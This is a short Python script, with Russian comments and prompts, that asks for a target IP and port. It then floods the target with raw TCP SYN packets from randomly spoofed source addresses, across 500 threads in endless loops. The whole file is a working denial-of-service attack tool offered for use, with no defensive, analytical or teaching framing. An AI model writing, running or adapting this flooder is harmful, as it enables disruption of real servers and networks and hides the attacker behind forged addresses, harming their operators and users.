import socket
import threading
import random
import time
import struct

target = input("IP: ")
port = int(input("Порт: "))

def create_syn_packet(source_ip, dest_ip, dest_port):
    """Создание сырого SYN пакета"""
    # IP заголовок
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr)
    
    # TCP заголовок
    tcp_source = random.randint(1024, 65535)
    tcp_seq = random.randint(1, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_flags = 0x02  # SYN
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_source, dest_port, tcp_seq, tcp_ack_seq,
        tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    
    return ip_header + tcp_header

def packet_attack():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while True:
            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            packet = create_syn_packet(fake_ip, target, port)
            sock.sendto(packet, (target, 0))
    except PermissionError:
        print("Нужен root доступ для RAW сокетов")

print("Запуск 500 потоков с пакетами")
for i in range(500):
    t = threading.Thread(target=packet_attack)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)
